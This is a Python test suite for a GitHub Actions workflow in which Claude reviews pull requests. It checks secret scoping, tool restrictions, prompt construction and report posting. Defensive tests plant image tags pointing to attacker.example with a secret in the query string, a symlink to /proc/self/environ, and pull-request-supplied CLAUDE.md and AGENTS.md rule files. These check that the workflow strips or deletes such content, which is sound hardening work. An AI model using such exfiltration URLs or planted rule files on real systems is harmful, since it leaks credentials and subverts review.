"""Run with: python3 -m unittest discover -s tests"""
import importlib.util
import json
import os
import re
import subprocess
import sys
import tempfile
import textwrap
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import test_review_pr_workflow as single  # noqa: E402 (the import needs tests/ on the path first)

ROOT = Path(__file__).resolve().parent.parent
WORKFLOW = ROOT / ".github" / "workflows" / "review-pr.yml"
README = ROOT / "examples" / "ci" / "README.md"

CREDENTIAL = "Fail when the harness has no credential"
HARNESS = "Check out the harness"
HARNESS_SHA = "Say which harness commit reviews"
BASE = "Check out the pull request's base"
HEAD = "Check out the pull request's head"
PROMPT = "Run the review-pr skill: build the prompt"
CLAUDE = "Run the review-pr skill on Claude"
SCHEMA = "Check the report against its schema"
GRADE = "Grade the review"
POST = "Post the report as one comment"
RULES = "Remove the pull request's own rules"
AGENTS_HEAD = "Check out the pull request's head to list its files"
SKIP = "Skip when only skip-paths files changed"
DRAFT = "Skip a draft pull request"
AGENTS_HARNESS = "Check out the harness's skills and agents"
RESOLVE = "Resolve the agents"
GRADE_HARNESS = "Check out the harness's grading files"
FETCH = "Fetch each agent's report"
REGRADE = "Put the grade on each agent's comment"
ASSUME = "Assume the review role on AWS"
CLEAR = "Clear the AWS credentials"
CHECKOUTS = (AGENTS_HARNESS, HARNESS, GRADE_HARNESS)
DRAFT_NOTICE = "::notice::This pull request is a draft, so the review skips until it's marked ready for review."
# id-token: write is for the Bedrock path, on the review job alone, which runs Claude. Every caller grants it,
# since a called workflow can't get more than its caller grants.
PERMISSIONS = ["contents: read", "id-token: write", "pull-requests: write"]
WORKFLOW_PERMISSIONS = ["contents: read", "pull-requests: write"]
SCHEMA_TEXT = (ROOT / "skills" / "review-pr" / "report.schema.json").read_text()
UNREADABLE = "The review's report couldn't be read, so no findings are posted."


def report(verdict, findings=()):
    """A report.json as the prompt asks Claude to write it."""
    return json.dumps({"verdict": verdict, "findings": list(findings)})


READY = report("ready")


def children(text, key):
    """The keys directly under a top-level `key:`, by their indent."""
    lines = text.splitlines()
    start = next(i for i, line in enumerate(lines) if line == key + ":")
    out = []
    for line in lines[start + 1:]:
        if line.strip() and not line.startswith(" "):
            break
        match = re.match(r"^  ([a-z_-]+):", line)
        if match:
            out.append(match.group(1))
    return out


def fenced(text, language):
    """The bodies of the ```language fences in a Markdown file."""
    return re.findall(r"^```{}\n(.*?)^```".format(re.escape(language)), text, re.M | re.S)


def sparse(step):
    """The paths a checkout step's sparse-checkout list names."""
    paths = []
    for line in step.split("sparse-checkout: |\n", 1)[1].splitlines():
        if not line.startswith(" " * 12):
            break
        paths.append(line.strip())
    return paths


class ReusableReviewWorkflow(unittest.TestCase):
    step = single.ReviewPrWorkflow.step
    run_step = single.ReviewPrWorkflow.run_step

    def setUp(self):
        self.assertTrue(WORKFLOW.is_file(), ".github/workflows/review-pr.yml doesn't exist")
        self.text = WORKFLOW.read_text()
        self.code = single.code(self.text)

    def steps(self, job=None):
        """Each step as (name, text), job by job, or only `job`'s."""
        return [step for key, text in single.jobs(self.code).items() if job in (None, key)
                for step in single.job_steps(text)]

    def job_head(self, job):
        """A job's keys, above its steps."""
        return single.jobs(self.code)[job].split("\n    steps:\n", 1)[0]

    def names(self):
        return [name for name, _ in self.steps()]

    def secrets_in(self, name):
        return set(re.findall(r"secrets\.(\w+)", self.step(name)))

    def run_in(self, name, cwd, **env):
        """Run a step's script from `cwd`, as Actions would from the workspace."""
        script = self.step(name).split("run: |\n", 1)[1]
        return subprocess.run(["bash", "--noprofile", "--norc", "-eo", "pipefail", "-c", textwrap.dedent(script)],
                              cwd=cwd, env={"PATH": os.environ["PATH"], **env}, capture_output=True, text=True)

    def test_it_runs_only_when_another_workflow_calls_it(self):
        self.assertEqual(children(self.code, "on"), ["workflow_call"])
        self.assertNotIn("pull_request_target", self.text)

    def test_it_takes_the_factory_repo_and_three_optional_secrets(self):
        on = self.code.split("\non:\n", 1)[1].split("\npermissions:", 1)[0]
        self.assertRegex(on, r"factory-repo:\n(?:\s+\S.*\n)*?\s+required: true\n(?:\s+\S.*\n)*?\s+type: string")
        for name in ("ANTHROPIC_API_KEY", "CLAUDE_CODE_OAUTH_TOKEN", "FACTORY_DEPLOY_KEY"):
            self.assertRegex(on, r"{}:\n(?:\s+description: .*\n)?\s+required: false".format(name))

    def test_the_old_ci_names_are_gone(self):
        for old in ("harness-repo", "HARNESS_DEPLOY_KEY", "HARNESS_REPO"):
            self.assertNotIn(old, self.text)

    def test_permissions_are_read_contents_write_comments_and_the_oidc_token_only(self):
        # #647 on #648's jobs: the OIDC token only where Claude runs, the review job.
        self.assertEqual(sorted(single.block(self.code, "permissions")), WORKFLOW_PERMISSIONS)
        self.assertEqual(len(re.findall(r"^\s*permissions:", self.code, re.M)), 2)
        review = self.job_head("review")
        self.assertEqual(sorted(line.strip() for line in review.split("    permissions:\n", 1)[1].split("\n    strategy:")[0]
                                .splitlines() if line.strip() and not line.strip().startswith("#")), PERMISSIONS)
        for job in ("agents", "grade"):
            self.assertNotIn("permissions:", self.job_head(job), job)
        self.assertNotIn("write-all", self.text)

    def test_claude_runs_restricted_with_the_agents_job_s_tools(self):
        # The tools are the resolved entry's: Read,Grep,Glob for every agent without a ci-shell: line, which
        # test_review_pr_workflow.ResolveTheAgents runs.
        call = re.search(r"claude -p[^<]*", self.step(CLAUDE))
        self.assertIsNotNone(call, "no claude -p call")
        self.assertEqual(call.group(0).split(),
                         ["claude", "-p", "--max-turns", "30", "--restricted", "--strict-mcp-config",
                          "--tools", '"$AGENT_TOOLS"', "\\"])
        self.assertIn("AGENT_TOOLS: ${{ matrix.agent.tools }}", self.step(CLAUDE))
        self.assertIn('tools = ["Read", "Grep", "Glob"] + ', self.step(RESOLVE))
        self.assertIn("npm install -g @anthropic-ai/claude-code@2.1.296", self.code)
        self.assertIn('cd "$GITHUB_WORKSPACE"', self.step(CLAUDE))
        self.assertIn('grep -qF -e "$ANTHROPIC_API_KEY"', self.step(CLAUDE))

    def test_claude_is_the_only_reviewer_and_gets_no_shell_but_a_ci_shell_line_s(self):
        self.assertIsNone(re.search(r"codex|ollama", self.text, re.I))
        self.assertNotRegex(self.text.split("\nname:", 1)[0], r"\bBash\b")
        for name, text in self.steps():
            if name != RESOLVE:
                self.assertNotRegex(text, r"\bBash\b", name)
        self.assertEqual(re.findall(r"Bash\([^)]*\)", self.step(RESOLVE)), ["Bash({}:*)"])
        self.assertNotIn("headless-tools", self.text)
        self.assertNotIn("--allowedTools", self.text)
        self.assertNotIn("--dangerously-skip-permissions", self.text)

    def test_no_expression_is_expanded_inside_a_script(self):
        self.assertTrue(single.run_lines(self.code), "found no run: blocks to check")
        for line in single.run_lines(self.code):
            self.assertNotIn("${{", line, "pass it through env: and read it as a variable")

    def test_secrets_are_only_ever_referenced_by_name(self):
        for number, line in enumerate(self.text.splitlines(), 1):
            self.assertNotIn("secrets.", single.SECRET_REF.sub("", line), "line {}".format(number))
        self.assertIsNone(single.KEY_SHAPES.search(self.text), "something in the file looks like a key")

    def test_a_missing_deploy_key_fails_and_names_it(self):
        result, output, _ = self.run_step(CREDENTIAL, FACTORY_DEPLOY_KEY="")
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("::error::", result.stdout)
        self.assertIn("FACTORY_DEPLOY_KEY", result.stdout)
        self.assertEqual(output, "")
        result, output, _ = self.run_step(CREDENTIAL, FACTORY_DEPLOY_KEY="k")
        self.assertEqual(result.returncode, 0, result.stdout)

    def test_a_missing_anthropic_key_skips_with_a_notice(self):
        result, _, added = self.run_step("Skip when Claude has no key")
        self.assertEqual(result.returncode, 0)
        self.assertIn("REVIEW_SKIPPED=true", added)
        self.assertIn("::notice::", result.stdout)
        self.assertIn("CLAUDE_CODE_OAUTH_TOKEN", result.stdout)

    def test_a_subscription_token_alone_runs_the_review(self):
        result, _, added = self.run_step("Skip when Claude has no key", CLAUDE_CODE_OAUTH_TOKEN="t")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertNotIn("REVIEW_SKIPPED", added)

    def review_with(self, report, **env):
        """Run the Claude step with a stand-in claude that writes `report`. Returns it and whether a report is left."""
        with tempfile.TemporaryDirectory() as tmp:
            bin_dir = Path(tmp) / "bin"
            bin_dir.mkdir()
            (bin_dir / "claude").write_text("#!/bin/sh\ncat > /dev/null\nprintf '%s\\n' \"$FAKE_REPORT\"\n")
            (bin_dir / "claude").chmod(0o755)
            (Path(tmp) / "prompt.md").write_text("review\n")
            result = self.run_in(CLAUDE, tmp, PATH=f"{bin_dir}:{os.environ['PATH']}", RUNNER_TEMP=tmp,
                                 GITHUB_WORKSPACE=tmp, FAKE_REPORT=report, **env)
            return result, (Path(tmp) / "report.json").exists()

    def test_a_report_holding_either_credential_is_not_posted(self):
        for name in ("ANTHROPIC_API_KEY", "CLAUDE_CODE_OAUTH_TOKEN"):
            result, kept = self.review_with("Looks fine. cred-123", **{name: "cred-123"})
            self.assertNotEqual(result.returncode, 0, name)
            self.assertFalse(kept, name)
            self.assertIn("::error::", result.stdout, name)
            self.assertNotIn("cred-123", result.stdout + result.stderr, name)

    def test_a_clean_report_with_one_credential_set_is_kept(self):
        for name in ("ANTHROPIC_API_KEY", "CLAUDE_CODE_OAUTH_TOKEN"):
            result, kept = self.review_with("Looks fine.", **{name: "cred-123"})
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            self.assertTrue(kept, name)

    def test_a_pull_request_from_a_fork_skips_with_a_notice(self):
        result, output, _ = self.run_step("Skip a pull request from a fork", HEAD_REPO="fork/r", THIS_REPO="o/r")
        self.assertEqual(result.returncode, 0)
        self.assertIn("review=false", output)
        self.assertIn("::notice::", result.stdout)
        result, output, _ = self.run_step("Skip a pull request from a fork")
        self.assertIn("review=true", output)

    def test_the_fork_check_compares_with_the_calling_repo(self):
        scope = self.step("Skip a pull request from a fork")
        self.assertIn("THIS_REPO: ${{ github.repository }}", scope)
        self.assertIn("HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}", scope)
        self.assertNotIn("harness", scope)

    def test_the_steps_run_in_the_planned_order(self):
        self.assertEqual(list(single.jobs(self.code)), ["agents", "review", "grade"])
        orders = {
            "agents": ["Skip a pull request from a fork", DRAFT, "Skip when Claude has no key", CREDENTIAL,
                       AGENTS_HARNESS, AGENTS_HEAD, SKIP, RESOLVE],
            "review": [HARNESS, HARNESS_SHA, BASE, HEAD, RULES, "Install the Claude Code CLI", PROMPT, ASSUME, CLAUDE,
                       CLEAR, SCHEMA, POST],
            "grade": [GRADE_HARNESS, FETCH, GRADE, REGRADE],
        }
        for job, order in orders.items():
            self.assertEqual([name for name, _ in self.steps(job)], order, job)

    def test_a_skipped_review_runs_nothing_after_the_key_check(self):
        steps = self.steps("agents")
        names = [name for name, _ in steps]
        for name, text in steps[names.index("Skip when Claude has no key") + 1:]:
            self.assertIn("steps.scope.outputs.review == 'true'", text, name)
            self.assertIn("env.REVIEW_SKIPPED != 'true'", text, name)
        # Only the resolve step says run=true, so a skipped or failed agents job runs neither job after it.
        self.assertIn("run: ${{ steps.resolve.outputs.run }}", self.job_head("agents"))
        self.assertIn('out.write("run=true\\n")', self.step(RESOLVE))
        review, grade = self.job_head("review"), self.job_head("grade")
        self.assertIn("\n    needs: agents\n", review)
        self.assertIn("\n    if: needs.agents.outputs.run == 'true'\n", review)
        self.assertIn("\n    needs: [agents, review]\n", grade)
        self.assertIn("\n    if: ${{ !cancelled() && needs.agents.outputs.run == 'true' }}\n", grade)
        self.assertIn("agent: ${{ fromJSON(needs.agents.outputs.matrix) }}", review)
        self.assertIn("fail-fast: false", review)
        self.assertNotIn("always()", self.code)

    def test_a_draft_skips_with_a_notice(self):
        result, _, added = self.run_step(DRAFT, DRAFT="true")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("REVIEW_SKIPPED=true", added)
        self.assertIn(DRAFT_NOTICE, result.stdout)

    def test_a_pull_request_that_is_not_a_draft_goes_on(self):
        result, _, added = self.run_step(DRAFT, DRAFT="false")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(added, "")
        self.assertNotIn("::notice::", result.stdout)
        present = "k"
        result, _, added = self.run_step("Skip when Claude has no key", ANTHROPIC_API_KEY=present)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertNotIn("REVIEW_SKIPPED", added)

    def test_a_draft_runs_nothing_after_it(self):
        # In the agents job; the jobs after it run only on its run output, as the test above checks.
        steps = self.steps("agents")
        after = steps[[name for name, _ in steps].index(DRAFT) + 1:]
        self.assertTrue(after, "no steps after the draft check")
        for name, text in after:
            if_line = next((line for line in text.splitlines() if line.strip().startswith("if:")), "")
            self.assertIn("env.REVIEW_SKIPPED != 'true'", if_line, name)
        draft = self.step(DRAFT)
        env = draft.split("env:\n", 1)[1].split("run: |", 1)[0]
        self.assertIn("DRAFT: ${{ github.event.pull_request.draft }}", env)

    def test_a_fork_never_reaches_the_draft_check(self):
        if_lines = [line.strip() for line in self.step(DRAFT).splitlines() if line.strip().startswith("if:")]
        self.assertEqual(if_lines, ["if: steps.scope.outputs.review == 'true'"])

    def test_the_harness_comes_from_its_default_branch_with_the_deploy_key(self):
        for name in CHECKOUTS:
            harness = self.step(name)
            self.assertIn("repository: ${{ inputs.factory-repo }}", harness, name)
            self.assertIn("ssh-key: ${{ secrets.FACTORY_DEPLOY_KEY }}", harness, name)
            self.assertIn("path: harness", harness, name)
            self.assertIn("persist-credentials: false", harness, name)
            self.assertNotRegex(harness, r"(?m)^\s+ref:", name)
        sha = self.step(HARNESS_SHA)
        self.assertIn('echo "Harness commit: $(git -C harness rev-parse HEAD)"', sha)
        self.assertIn("harness/skills/review-pr/SKILL.md", sha)
        self.assertIn("::error::", sha)
        self.assertIn("FACTORY_DEPLOY_KEY", sha)
        self.assertIn("inputs.factory-repo", sha)
        self.assertRegex(sha, r"exit [1-9]")

    def test_a_harness_without_the_skill_fails(self):
        result, _, _ = self.run_step(HARNESS_SHA, FACTORY_REPO="o/not-a-harness")
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("o/not-a-harness", result.stdout)

    def test_the_project_s_rules_come_from_its_base(self):
        base = self.step(BASE)
        self.assertIn("ref: ${{ github.event.pull_request.base.sha }}", base)
        self.assertIn("path: base", base)
        head = self.step(HEAD)
        self.assertIn("path: head", head)
        self.assertIn("fetch-depth: 0", head)
        for name in (BASE, HEAD, AGENTS_HEAD):
            self.assertIn("persist-credentials: false", self.step(name), name)
            self.assertNotIn("ssh-key", self.step(name), name)
        self.assertIn("find head", self.step(RULES))

    def test_the_pull_request_s_rules_go_at_any_depth(self):
        with tempfile.TemporaryDirectory() as tmp:
            head = Path(tmp) / "head"
            gone = ["AGENTS.md", "CLAUDE.md", "CLAUDE.local.md", "src/CLAUDE.md", "src/CLAUDE.local.md",
                    "deep/a/AGENTS.md", ".claude/settings.json", "src/.claude/agents/x.md"]
            kept = ["README.md", "src/app.py", "docs/CLAUDE.md.txt", ".git/config", ".git/CLAUDE.md"]
            for path in gone + kept:
                (head / path).parent.mkdir(parents=True, exist_ok=True)
                (head / path).write_text("x")
            (head / "docs" / "CLAUDE.md").symlink_to("../README.md")
            (head / "environ").symlink_to("/proc/self/environ")
            (head / "outside").symlink_to(tmp)
            result = self.run_in(RULES, tmp)
            self.assertEqual(result.returncode, 0, result.stderr)
            for path in gone + ["docs/CLAUDE.md", "environ", "outside", ".claude", "src/.claude"]:
                self.assertFalse(os.path.lexists(head / path), path)
            for path in kept:
                self.assertTrue((head / path).is_file(), path)

    def test_the_posted_report_carries_no_image(self):
        with tempfile.TemporaryDirectory() as tmp:
            bin_dir = Path(tmp) / "bin"
            bin_dir.mkdir()
            (bin_dir / "gh").write_text("#!/bin/sh\nexit 0\n")
            (bin_dir / "gh").chmod(0o755)
            (Path(tmp) / "report.md").write_text(
                "Changes needed.\n"
                "![x](https://attacker.example/a?k=secret)\n"
                "![ref][1]\n"
                '<img src="https://attacker.example/b">\n'
                '<IMG SRC="https://attacker.example/c">\n'
                '<picture><source srcset="https://attacker.example/d"></picture>\n'
                "`Vec<String>` is fine.\n")
            result = self.run_in(POST, tmp, RUNNER_TEMP=tmp, PATH=f"{bin_dir}:{os.environ['PATH']}",
                                 REPO="o/r", PR="1", GH_TOKEN="", AGENT_NAME="review-pr", HEAD_SHA="abc123")
            self.assertEqual(result.returncode, 0, result.stderr)
            comment = (Path(tmp) / "comment.md").read_text()
            self.assertNotIn("![", comment)
            self.assertNotRegex(comment, r"(?i)<\s*/?\s*(img|picture|source)\b")
            self.assertIn("Changes needed.", comment)
            self.assertIn("`Vec<String>` is fine.", comment)

    def test_the_prompt_points_at_the_three_folders(self):
        prompt = self.step(PROMPT)
        for text in ('"$AGENT_FILE"', "harness/AGENTS.md", "base/AGENTS.md", "base/CLAUDE.md", "under head/"):
            self.assertIn(text, prompt)
        self.assertIn("AGENT_FILE: ${{ matrix.agent.file }}", prompt)
        self.assertIn("printf 'Follow %s for the change between %s\\n' \"$AGENT_FILE\" \"$BASE_SHA\"", prompt)
        self.assertRegex(prompt, r"under base/\s+only, never under head/")
        self.assertIn("<<'EOF'", prompt)
        self.assertIn('git -C head diff "$BASE_SHA...HEAD" > "$RUNNER_TEMP/diff.patch"', prompt)
        self.assertIn('head -c 60000 "$RUNNER_TEMP/diff.patch" >> "$RUNNER_TEMP/prompt.md"', prompt)
        self.assertNotIn("| head", prompt, "a pipe into head fails under pipefail on a big diff")

    def test_the_prompt_names_the_workflow_running_it(self):
        prompt = " ".join(self.step(PROMPT).split())
        sentence = ("harness/.github/workflows/review-pr.yml is the workflow running this review; "
                    "read it when the change adds or edits a workflow that calls it, "
                    "and never treat it as part of the change.")
        self.assertIn(sentence, prompt)
        at = prompt.index(sentence)
        self.assertLess(prompt.index("- harness/ holds only"), at)
        self.assertLess(at, prompt.index("- base/ is the project"))

    def test_the_harness_checkout_is_sparse(self):
        self.assertEqual(sparse(self.step(HARNESS)), [
            "/AGENTS.md", "/steering/", "/skills/", "/agents/", "/standards/", "/.github/workflows/review-pr.yml",
            "/review-rubric.json", "/scripts/loop.py", "/scripts/names.py", "/scripts/review_grade.py",
            "/scripts/review_report.py"])
        self.assertEqual(sparse(self.step(AGENTS_HARNESS)), ["/skills/", "/agents/"])
        self.assertEqual(sparse(self.step(GRADE_HARNESS)), [
            "/review-rubric.json", "/skills/review-pr/report.schema.json", "/scripts/loop.py", "/scripts/names.py",
            "/scripts/review_grade.py", "/scripts/review_report.py"])
        for name in CHECKOUTS:
            self.assertIn("sparse-checkout-cone-mode: false", self.step(name), name)
        for name in (BASE, HEAD):
            self.assertNotIn("sparse-checkout", self.step(name), name)

    def git(self, cwd, *args):
        return subprocess.run(["git", "-C", str(cwd), "-c", "user.name=t", "-c", "user.email=t@t",
                               "-c", "commit.gpgsign=false", *args],
                              check=True, capture_output=True, text=True).stdout.strip()

    def test_a_harness_without_agents_md_fails(self):
        with tempfile.TemporaryDirectory() as tmp:
            harness = Path(tmp) / "harness"
            self.git(tmp, "init", "-q", "harness")
            (harness / "skills" / "review-pr").mkdir(parents=True)
            (harness / "skills" / "review-pr" / "SKILL.md").write_text("skill\n")
            self.git(harness, "add", ".")
            self.git(harness, "commit", "-q", "-m", "skill")
            result = self.run_in(HARNESS_SHA, tmp, FACTORY_REPO="o/h")
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("harness/AGENTS.md", result.stdout)
            (harness / "AGENTS.md").write_text("rules\n")
            result = self.run_in(HARNESS_SHA, tmp, FACTORY_REPO="o/h")
            self.assertEqual(result.returncode, 0, result.stdout)

    def prompt_for(self, big, standards=None):
        """The prompt and the GITHUB_ENV text built for a head commit that changes small.txt,
        and adds big.txt when `big`. `standards` are paths created under harness/standards/."""
        with tempfile.TemporaryDirectory() as tmp:
            if standards is not None:
                (Path(tmp) / "harness" / "standards").mkdir(parents=True)
                for path in standards:
                    (Path(tmp) / "harness" / "standards" / path).parent.mkdir(parents=True, exist_ok=True)
                    (Path(tmp) / "harness" / "standards" / path).write_text("# A standard\n")
            env = Path(tmp) / "env"
            env.touch()
            head = Path(tmp) / "head"
            self.git(tmp, "init", "-q", "head")
            (head / "small.txt").write_text("one\n")
            self.git(head, "add", ".")
            self.git(head, "commit", "-q", "-m", "base")
            base = self.git(head, "rev-parse", "HEAD")
            (head / "small.txt").write_text("two\n")
            if big:
                (head / "big.txt").write_text(("x" * 99 + "\n") * 700)
            self.git(head, "add", ".")
            self.git(head, "commit", "-q", "-m", "change")
            result = self.run_in(PROMPT, tmp, BASE_SHA=base, RUNNER_TEMP=tmp, GITHUB_ENV=str(env),
                                 AGENT_FILE="harness/skills/review-pr/SKILL.md")
            self.assertEqual(result.returncode, 0, result.stderr)
            prompt = (Path(tmp) / "prompt.md").read_text()
            self.assertEqual(prompt.splitlines()[:2], [
                "Follow harness/skills/review-pr/SKILL.md for the change between " + base,
                "and the pull request's head. This directory holds three folders:"])
            return prompt, env.read_text()

    CUT = ("The diff was cut at 60000 bytes. Every changed file is listed under CHANGED FILES; "
           "read any the cut dropped under head/.")
    READ_EACH = ("These are the team's code standards. Read each one, hold the change to them, "
                 "and name the file and heading of the standard a finding breaks.")
    NO_STANDARDS = "None. The harness has no standards/ folder, or nothing in it."
    NOT_LOADED = ("No team standards were loaded: the harness's standards/ folder is missing or empty, "
                  "so this review holds the change to the repo's own rules only.")

    def standards_section(self, prompt):
        self.assertIn("\nSTANDARDS:\n", prompt)
        return prompt.split("\nSTANDARDS:\n", 1)[1].split("\nCHANGED FILES:", 1)[0].splitlines()

    def test_the_standards_are_listed_in_order(self):
        prompt, env = self.prompt_for(big=False, standards=["python.md", "api/errors.md", "README.md"])
        self.assertEqual(self.standards_section(prompt),
                         ["harness/standards/api/errors.md", "harness/standards/python.md", self.READ_EACH])
        self.assertFalse([line for line in self.standards_section(prompt) if "README.md" in line])
        self.assertNotIn("standards/README.md", prompt)
        self.assertIn("STANDARDS_LOADED=true", env)
        self.assertNotIn("STANDARDS_LOADED=false", env)

    def test_no_standards_says_none(self):
        for standards in (None, ["README.md"]):
            prompt, env = self.prompt_for(big=False, standards=standards)
            section = self.standards_section(prompt)
            self.assertIn(self.NO_STANDARDS, section, standards)
            self.assertNotIn(self.READ_EACH, prompt, standards)
            self.assertIn("STANDARDS_LOADED=false", env, standards)
            self.assertNotIn("STANDARDS_LOADED=true", env, standards)

    def test_the_posted_report_says_when_no_standards_loaded(self):
        for loaded in ("false", "true"):
            with tempfile.TemporaryDirectory() as tmp:
                bin_dir = Path(tmp) / "bin"
                bin_dir.mkdir()
                (bin_dir / "gh").write_text("#!/bin/sh\nexit 0\n")
                (bin_dir / "gh").chmod(0o755)
                (Path(tmp) / "report.md").write_text("Changes needed.\n")
                result = self.run_in(POST, tmp, RUNNER_TEMP=tmp, PATH=f"{bin_dir}:{os.environ['PATH']}",
                                     REPO="o/r", PR="1", GH_TOKEN="", STANDARDS_LOADED=loaded,
                                     AGENT_NAME="review-pr", HEAD_SHA="abc123")
                self.assertEqual(result.returncode, 0, result.stderr)
                lines = (Path(tmp) / "comment.md").read_text().splitlines()
                self.assertEqual(lines[:4], ["<!-- review-pr-report -->", "<!-- head: abc123 -->",
                                             "**Agent:** review-pr", ""])
                if loaded == "false":
                    self.assertEqual(lines[4:7], [self.NOT_LOADED, "", "Changes needed."])
                else:
                    self.assertNotIn(self.NOT_LOADED, lines)
                    self.assertEqual(lines[4], "Changes needed.")

    def test_a_big_diff_lists_every_file_and_says_it_was_cut(self):
        prompt, _ = self.prompt_for(big=True)
        self.assertIn("CHANGED FILES:", prompt)
        listed = prompt.split("CHANGED FILES:", 1)[1].split("\nDIFF (cut", 1)[0]
        self.assertIn("A\tbig.txt", listed)
        self.assertIn("M\tsmall.txt", listed)
        self.assertTrue(prompt.strip().endswith(self.CUT), prompt[-300:])

    def test_a_small_diff_has_no_cut_line(self):
        prompt, _ = self.prompt_for(big=False)
        self.assertIn("CHANGED FILES:", prompt)
        self.assertIn("M\tsmall.txt", prompt.split("CHANGED FILES:", 1)[1].split("\nDIFF (cut", 1)[0])
        self.assertNotIn(self.CUT, prompt)

    def test_the_deploy_key_reaches_only_the_check_and_the_harness_checkouts(self):
        holding = [name for name, text in self.steps() if "secrets.FACTORY_DEPLOY_KEY" in text]
        self.assertEqual(sorted(holding), sorted([CREDENTIAL] + list(CHECKOUTS)))
        for name in (AGENTS_HEAD, SKIP, RESOLVE, PROMPT, CLAUDE, SCHEMA, POST, FETCH, GRADE, REGRADE):
            self.assertNotIn("FACTORY_DEPLOY_KEY", self.step(name), name)

    def test_each_step_holds_only_its_own_key(self):
        claude = {"ANTHROPIC_API_KEY", "CLAUDE_CODE_OAUTH_TOKEN"}
        self.assertEqual(self.secrets_in(CLAUDE), claude)
        self.assertEqual(self.secrets_in("Skip when Claude has no key"), claude)
        self.assertEqual(self.secrets_in(CREDENTIAL), {"FACTORY_DEPLOY_KEY"})
        for name in CHECKOUTS:
            self.assertEqual(self.secrets_in(name), {"FACTORY_DEPLOY_KEY"}, name)
        for name in (DRAFT, AGENTS_HEAD, SKIP, RESOLVE, PROMPT, SCHEMA, GRADE, POST, BASE, HEAD, HARNESS_SHA, FETCH,
                     REGRADE):
            self.assertEqual(self.secrets_in(name), set(), name)
        for job in single.jobs(self.code):
            self.assertNotIn("secrets.", self.job_head(job), job)
        # The schema check holds nothing at all: no env, so no Claude credential, deploy key or token.
        self.assertNotIn("env:", self.step(SCHEMA))
        for word in ("ANTHROPIC_API_KEY", "CLAUDE_CODE_OAUTH_TOKEN", "FACTORY_DEPLOY_KEY", "GH_TOKEN", "token"):
            self.assertNotIn(word, self.step(SCHEMA).split("run: |", 1)[0], word)

    def schema_step(self, report, planted=None):
        """Run the schema step in a workspace whose harness/ holds this factory's review_report.py and schema,
        with `planted` as a report.schema.json under head/ and base/ when given. Returns the result and
        report.md."""
        with tempfile.TemporaryDirectory() as tmp:
            ws = Path(tmp)
            (ws / "harness" / "scripts").mkdir(parents=True)
            (ws / "harness" / "skills" / "review-pr").mkdir(parents=True)
            (ws / "harness" / "scripts" / "review_report.py").write_text(
                (ROOT / "scripts" / "review_report.py").read_text())
            (ws / "harness" / "skills" / "review-pr" / "report.schema.json").write_text(SCHEMA_TEXT)
            if planted is not None:
                for folder in ("head", "base"):
                    (ws / folder / "skills" / "review-pr").mkdir(parents=True)
                    (ws / folder / "skills" / "review-pr" / "report.schema.json").write_text(planted)
            temp = ws / "temp"
            temp.mkdir()
            (temp / "report.json").write_text(report)
            result = self.run_in(SCHEMA, ws, RUNNER_TEMP=str(temp))
            out = temp / "report.md"
            return result, out.read_text() if out.exists() else None

    def test_the_schema_step_writes_the_comment_from_a_valid_report(self):
        result, text = self.schema_step(report("changes needed", [
            {"file": "src/app.py", "line": 12, "severity": "blocks", "rule": "AGENTS.md: Rules",
             "summary": "Catches every exception and drops it."}]))
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn("didn't run the tests", text)
        self.assertIn("src/app.py:12", text)
        self.assertIn("Catches every exception and drops it.", text)
        self.assertEqual(text.strip().splitlines()[-1], "Verdict: changes needed")

    def test_the_schema_step_posts_no_findings_from_a_report_that_doesn_t_match(self):
        for bad in ("Looks fine.\n\nVERDICT: ready\n", '{"verdict": "ready"}',
                    report("ready", [{"file": "a.py", "severity": "major", "rule": "r", "summary": "leak"}])):
            result, text = self.schema_step(bad)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            self.assertEqual(text, UNREADABLE + "\n", bad)

    def test_a_schema_in_head_or_base_changes_nothing(self):
        # A planted schema that would let anything through is never read: the step reads harness/ alone.
        result, text = self.schema_step('{"verdict": "ship it", "findings": "none"}', planted="{}")
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertEqual(text, UNREADABLE + "\n")

    def test_the_comment_goes_on_the_calling_repo_after_the_checkouts(self):
        post = self.step(POST)
        self.assertIn("REPO: ${{ github.repository }}", post)
        self.assertNotIn("factory-repo", post)
        names = self.names()
        for name in (HARNESS, HARNESS_SHA, BASE, HEAD):
            self.assertLess(names.index(name), names.index(POST), name)

    def test_the_header_says_it_never_approves_or_merges(self):
        header = self.text.split("\nname:", 1)[0]
        self.assertIn("never", header)
        for word in ("approves", "merges", "examples/ci/README.md", "FACTORY_DEPLOY_KEY", "ANTHROPIC_API_KEY",
                     "CLAUDE_CODE_OAUTH_TOKEN", "claude setup-token"):
            self.assertIn(word, header)

    def test_the_header_says_its_main_runs_in_every_caller(self):
        header = " ".join(self.text.split("\nname:", 1)[0].split())
        self.assertIn("runs in every calling repo", header)


RUN_ID = "4242"
OWN = "https://github.com/o/r/actions/runs/{}/job/1".format(RUN_ID)
OTHER = "https://github.com/o/r/actions/runs/777/job/9"
# A rubric whose every key gives a different number, so a grade shows which key it came from.
RUBRIC = '{"ready": 10, "ready with nits": 8, "changes needed": 3, "failing": 1, "unreadable": 2}'
NOT_LATER = "Nothing grades this review later"
# A stand-in gh: it logs its arguments, fails when told to, and otherwise prints the check runs for this call,
# runs.<n> on its nth call when that file exists, else runs.
FAKE_GH = """#!/bin/sh
printf '%s\\n' "$*" >> "$FAKE/args"
if [ -n "$FAKE_GH_FAIL" ]; then echo "$FAKE_GH_FAIL" >&2; exit 1; fi
n=$(( $(cat "$FAKE/count" 2>/dev/null || echo 0) + 1 ))
echo "$n" > "$FAKE/count"
if [ -f "$FAKE/runs.$n" ]; then cat "$FAKE/runs.$n"; else cat "$FAKE/runs"; fi
"""


REFUSED = "HTTP 403: Resource not accessible by integration"


def tsv(runs):
    """Each run as (status, conclusion, page) or (status, conclusion, page, check run id), id 0 if left out."""
    return "".join("{}\t{}\t{}\t{}\n".format(*(tuple(run) + ("0",))[:4]) for run in runs)


